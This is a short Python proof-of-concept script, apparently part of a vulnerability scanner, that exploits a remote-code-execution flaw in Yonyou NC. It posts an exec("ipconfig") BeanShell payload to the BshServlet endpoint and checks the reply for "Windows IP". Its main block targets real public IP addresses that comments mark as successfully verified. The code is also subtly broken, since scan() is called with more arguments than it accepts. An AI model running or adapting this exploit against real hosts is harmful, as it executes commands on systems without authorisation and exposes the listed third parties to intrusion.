# -*- coding:utf-8 -*-

import sys;sys.path.append("../")

import requests
from lib.io import MyPrint

'''
name: "用友nc_beanshell_rce"
'''



def scan(domain, ip, port):

    leakName = "nc_beanshell_rce"

    url = domain + "/servlet/~ic/bsh.servlet.BshServlet"

    data = {
        'bsh.script': 'exec("ipconfig")'    # ipconfig，经过测试发现基本都是Windows主机
    }

    try:
        r = requests.post(url, data=data, timeout=3)
    except Exception as e:
        MyPrint(-1, leakName)
    else:

        if r.status_code == 200 and "Windows IP" in r.text:
            MyPrint(1, leakName)
        else:
            MyPrint(0, leakName)




if __name__ == "__main__":
    # scan("http", "110.49.13.99", "110.49.13.99", "80")       # 网络异常

    scan("http", "175.25.51.58", "175.25.51.58", "8080")         # 成功验证2
    # scan("http", "113.204.16.210", "113.204.16.210", "8088")     # 成功验证3
